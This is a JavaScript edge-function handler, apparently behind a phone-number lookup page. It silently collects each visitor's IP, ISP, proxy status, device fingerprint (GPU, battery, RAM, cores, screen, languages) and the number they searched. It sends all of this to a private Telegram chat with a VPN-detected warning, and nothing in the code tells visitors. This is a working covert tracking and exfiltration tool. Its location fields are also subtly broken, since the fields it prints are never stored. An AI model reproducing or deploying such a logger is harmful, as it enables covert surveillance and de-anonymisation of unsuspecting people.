export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json',
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers });
  }

  try {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // ===== SERVER-SIDE DATA =====
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 'Unknown';
    const userAgent = request.headers.get('user-agent') || 'Unknown';
    const referer = request.headers.get('referer') || 'Direct';
    const acceptLang = request.headers.get('accept-language') || 'Unknown';

    // ===== IP LOOKUP (ip-api.com se) =====
    let ipInfo = {
      isp: 'Unknown',
      org: 'Unknown',
      as: 'Unknown',
      asname: 'Unknown',
      proxy: false,
      hosting: false,
      mobile: false,
    };

    try {
      if (ip && ip !== 'Unknown' && ip !== '127.0.0.1' && !ip.startsWith('192.168')) {
        const ipRes = await fetch(
          `http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
        );
        const ipData = await ipRes.json();
        
        if (ipData.status === 'success') {
          ipInfo = {
            isp: ipData.isp || 'Unknown',
            org: ipData.org || 'Unknown',
            as: ipData.as || 'Unknown',
            asname: ipData.asname || 'Unknown',
            reverse: ipData.reverse || 'Unknown',
            proxy: ipData.proxy || false,
            hosting: ipData.hosting || false,
            mobile: ipData.mobile || false,
          };
        }
      }
    } catch (e) {
      console.error('IP lookup failed:', e);
    }

    // ===== CLIENT-SIDE DATA =====
    const body = await request.json().catch(() => ({}));
    const searchType = body.searchType || 'Unknown';
    const searchedNumber = body.searchedNumber || 'Not provided';
    const screen = body.screen || 'Unknown';
    const screenAvail = body.screenAvail || 'Unknown';
    const colorDepth = body.colorDepth || 'Unknown';
    const pixelRatio = body.pixelRatio || 'Unknown';
    const language = body.language || 'Unknown';
    const languages = body.languages || 'Unknown';
    const platform = body.platform || 'Unknown';
    const browserTZ = body.timezone || 'Unknown';
    const battery = body.battery || 'Unknown';
    const gpu = body.gpu || 'Unknown';
    const cores = body.cores || 'Unknown';
    const memory = body.memory || 'Unknown';
    const touch = body.touch || 'Unknown';
    const cookies = body.cookies || 'Unknown';
    const doNotTrack = body.doNotTrack || 'Unknown';
    const online = body.online || 'Unknown';
    const connection = body.connection || 'Unknown';
    const pageLoadTime = body.pageLoadTime || 'Unknown';
    const vendor = body.vendor || 'Unknown';

    const device = detectDevice(userAgent);
    const browser = detectBrowser(userAgent);
    const os = detectOS(userAgent);

    const timestamp = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
    });

    const mapsLink =
      ipInfo.lat && ipInfo.lon
        ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`
        : 'Not available';

    // ===== PROXY/VPN WARNING =====
    let vpnWarning = '';
    if (ipInfo.proxy || ipInfo.hosting) {
      vpnWarning = '\n⚠️ *WARNING: VPN/Proxy Detected!*';
    }

    // ===== TELEGRAM MESSAGE =====
    const message = `
🚨 *NEW SEARCH ALERT* 🚨${vpnWarning}

🔍 *Type:* ${searchType}
🔍 *Searched:* \`${searchedNumber}\`

━━━━━━━━━━━━━━━━━━━━
🌐 *IP ADDRESS INFO*
━━━━━━━━━━━━━━━━━━━━
📡 *IP:* \`${ip}\`
🏢 *ISP:* ${ipInfo.isp}
🏭 *Organization:* ${ipInfo.org}
🔢 *ASN:* ${ipInfo.as}
📛 *AS Name:* ${ipInfo.asname}
🔄 *Reverse DNS:* ${ipInfo.reverse || 'N/A'}

━━━━━━━━━━━━━━━━━━━━
📍 *Location*
━━━━━━━━━━━━━━━━━━━━
🌍 *Country:* ${ipInfo.country || 'Unknown'}
🏙️ *City:* ${ipInfo.city || 'Unknown'}
📍 *Region:* ${ipInfo.regionName || 'Unknown'} (${ipInfo.region || 'N/A'})
📮 *Postal:* ${ipInfo.zip || 'Unknown'}
🗺️ *Coords:* ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
🕐 *Timezone:* ${ipInfo.timezone || 'Unknown'}
🔗 [Open in Maps](${mapsLink})

━━━━━━━━━━━━━━━━━━━━
🛡️ *Security Flags*
━━━━━━━━━━━━━━━━━━━━
🚫 *Proxy/VPN:* ${ipInfo.proxy ? '⚠️ YES' : '✅ No'}
☁️ *Hosting/Datacenter:* ${ipInfo.hosting ? '⚠️ YES' : '✅ No'}
📱 *Mobile Network:* ${ipInfo.mobile ? 'Yes' : 'No'}

━━━━━━━━━━━━━━━━━━━━
💻 *Device Info*
━━━━━━━━━━━━━━━━━━━━
📱 *Device:* ${device}
🖥️ *OS:* ${os}
🌐 *Browser:* ${browser}
🏭 *Vendor:* ${vendor}
🖥️ *Screen:* ${screen}
📐 *Available:* ${screenAvail}
🎨 *Color Depth:* ${colorDepth}
🔍 *Pixel Ratio:* ${pixelRatio}
🕐 *Browser TZ:* ${browserTZ}
🗣️ *Language:* ${language}
🌍 *All Languages:* ${languages}
🧩 *Platform:* ${platform}
🔋 *Battery:* ${battery}
🎮 *GPU:* ${gpu}
⚙️ *CPU Cores:* ${cores}
💾 *RAM:* ${memory} GB
👆 *Touch:* ${touch}
🍪 *Cookies:* ${cookies}
🚫 *Do Not Track:* ${doNotTrack}
📶 *Online:* ${online}
🌐 *Connection:* ${connection}
⏱️ *Page Load:* ${pageLoadTime} ms

━━━━━━━━━━━━━━━━━━━━
🔗 *Other*
━━━━━━━━━━━━━━━━━━━━
↩️ *Referrer:* ${referer}
🗣️ *Accept-Language:* ${acceptLang}
🕐 *Time:* ${timestamp}

━━━━━━━━━━━━━━━━━━━━
📄 *Full User Agent:*
\`${userAgent}\`
`;

    const tgResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
        }),
      }
    );

    const tgResult = await tgResponse.json();

    return new Response(
      JSON.stringify({ success: true, telegram_sent: tgResult.ok }),
      { status: 200, headers }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { status: 500, headers }
    );
  }
}

// ===== HELPERS =====

function detectDevice(ua) {
  if (/iPhone/i.test(ua)) {
    const m = ua.match(/iPhone OS (\d+_\d+)/);
    return m ? `iPhone (iOS ${m[1].replace('_', '.')})` : 'iPhone';
  }
  if (/iPad/i.test(ua)) return 'iPad';
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s[\d.]+;\s([^)]+)/);
    return m ? `Android (${m[1]})` : 'Android';
  }
  if (/Windows/i.test(ua)) return 'Windows PC';
  if (/Macintosh/i.test(ua)) return 'Mac';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Unknown';
}

function detectBrowser(ua) {
  if (/Edg\//i.test(ua)) return 'Microsoft Edge';
  if (/OPR\//i.test(ua) || /Opera/i.test(ua)) return 'Opera';
  if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
  if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
  if (/Firefox\//i.test(ua)) return 'Firefox';
  return 'Unknown';
}

function detectOS(ua) {
  if (/Windows NT 10/i.test(ua)) return 'Windows 10/11';
  if (/Windows NT 6.3/i.test(ua)) return 'Windows 8.1';
  if (/Windows NT 6.1/i.test(ua)) return 'Windows 7';
  if (/Mac OS X/i.test(ua)) return 'macOS';
  if (/Android/i.test(ua)) return 'Android';
  if (/iPhone|iPad/i.test(ua)) return 'iOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Unknown';
}
